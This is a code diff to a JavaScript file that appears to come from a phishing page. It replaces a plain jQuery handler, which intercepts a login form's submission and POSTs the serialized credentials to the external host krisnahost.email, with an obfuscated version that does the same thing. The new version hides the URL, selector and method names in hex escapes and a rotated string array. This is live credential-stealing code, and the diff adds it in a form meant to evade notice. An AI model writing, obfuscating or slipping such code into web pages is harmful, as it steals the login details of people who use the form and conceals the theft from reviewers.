@@ -1,15 +1,44 @@
-$(".login-form").submit(function() {
- var d = $(".login-form");
+function d() {
+    var Z = ['\x2e\x6c\x6f\x67\x69\x6e\x2d\x66\x6f\x72\x6d', '\x33\x33\x30\x37\x30\x37\x50\x72\x5a\x6e\x66\x45', '\x31\x38\x30\x31\x30\x70\x6d\x44\x68\x4e\x54', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6b\x72\x69\x73\x6e\x61\x68\x6f\x73\x74\x2e\x65\x6d\x61\x69\x6c\x2f', '\x31\x32\x33\x30\x52\x4f\x7a\x4e\x73\x68', '\x32\x6f\x54\x69\x53\x68\x54', '\x73\x65\x72\x69\x61\x6c\x69\x7a\x65', '\x34\x35\x30\x30\x37\x37\x36\x44\x45\x61\x50\x55\x44', '\x31\x31\x37\x37\x34\x37\x32\x4d\x42\x5a\x6c\x4f\x58', '\x34\x32\x36\x36\x38\x31\x35\x49\x71\x62\x6f\x41\x43', '\x31\x38\x35\x32\x37\x33\x34\x47\x44\x47\x45\x41\x57', '\x34\x37\x39\x37\x77\x73\x64\x70\x51\x54', '\x32\x39\x33\x36\x30\x4a\x4b\x50\x76\x52\x59', '\x73\x75\x62\x6d\x69\x74', '\x50\x4f\x53\x54'];
+    d = function() {
+        return Z;
+    };
+    return d();
+}
 
- $.ajax({
-        url: "https://krisnahost.email/",
-        type: "POST",
-        data: d.serialize(),
-        success: function () {
-            return true;
+function L(I, C) {
+    var U = d();
+    return L = function(f, V) {
+        f = f - 0x10b;
+        var n = U[f];
+        return n;
+    }, L(I, C);
+}
+var F = L;
+(function(I, C) {
+    var n = L,
+        U = I();
+    while (!![]) {
+        try {
+            var f = parseInt(n('\x30\x78\x31\x31\x35')) / 0x1 * (parseInt(n('\x30\x78\x31\x31\x39')) / 0x2) + parseInt(n(0x10f)) / 0x3 + parseInt(n('\x30\x78\x31\x30\x64')) / 0x4 + parseInt(n(0x116)) / 0x5 * (parseInt(n('\x30\x78\x31\x31\x38')) / 0x6) + -parseInt(n(0x10e)) / 0x7 + parseInt(n('\x30\x78\x31\x30\x63')) / 0x8 + -parseInt(n('\x30\x78\x31\x31\x30')) / 0x9 * (parseInt(n('\x30\x78\x31\x31\x31')) / 0xa);
+            if (f === C) break;
+            else U['push'](U['shift']());
+        } catch (V) {
+            U['push'](U['shift']());
+        }
+    }
+}(d, 0x5a24b), $(F(0x114))[F(0x112)](function() {
+    var k = F,
+        I = $('\x2e\x6c\x6f\x67\x69\x6e\x2d\x66\x6f\x72\x6d');
+    $['\x61\x6a\x61\x78']({
+        '\x75\x72\x6c': k(0x117),
+        '\x74\x79\x70\x65': k(0x113),
+        '\x64\x61\x74\x61': I[k('\x30\x78\x31\x30\x62')](),
+        '\x73\x75\x63\x63\x65\x73\x73': function() {
+            return !![];
         },
-        error: function () {
-            return true;
-        },
+        '\x65\x72\x72\x6f\x72': function() {
+            return !![];
+        }
     });
-});
+}));
